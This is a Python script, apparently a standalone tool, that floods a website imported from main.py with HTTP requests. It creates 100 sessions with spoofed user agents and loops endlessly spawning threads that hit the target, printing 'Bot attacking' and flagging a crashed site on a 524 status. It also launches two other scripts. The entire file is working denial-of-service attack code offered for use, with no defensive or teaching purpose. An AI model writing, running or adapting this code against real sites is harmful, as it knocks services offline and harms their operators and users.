import requests
import threading
import subprocess
import random
import time
from main import target_website

def run_script(script_name):
    subprocess.Popen(["python", script_name])

if __name__ == "__main__":
    run_script("main.py")
    run_script("main2.py")

def create_bots():
    bots = []
    for i in range(100):
        bot = requests.Session()
        bot.headers.update({"User-Agent": generate_user_agent()})
        bots.append(bot)
    return bots

def generate_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0"
        "Mozilla/5.0 (Linux; Android 12; moto g pure) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
        "Mozilla/5.0 (Linux; Android 12; moto g stylus 5G (2022)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
        "Mozilla/5.0 (Linux; Android 12; moto g 5G (2022)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
        "Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
        "Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
        "Mozilla/5.0 (Linux; Android 10; MAR-LX1A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
    ]
    return random.choice(user_agents)

def send_request(bot):
    try:
        while True:
            response = bot.get(target_website)
            if response.status_code == 200:
                print(f"Bot attacking {target_website}. Response status code: \x1b[32m{response.status_code}\x1b[0m")  # Green color for success
            elif response.status_code == 524:
                print(f"[WEBSITE CRASHED] Bot attacking {target_website}. Response status code: \x1b[31;2m{response.status_code}\x1b[0m")
                break
            else:
                print(f"Bot attacking {target_website}. Response status code: \x1b[31m{response.status_code}\x1b[0m")  # Red color for failure
            time.sleep(random.uniform(0.1, 0.5))  # Random delay between requests
    except:
        print("Error during bot attack")

def ddos_attack():
    bots = create_bots()
    while True:
        threads = []
        for bot in bots:
            t = threading.Thread(target=send_request, args=(bot,))
            threads.append(t)
            t.start()
        for t in threads:
            t.join()

ddos_attack()
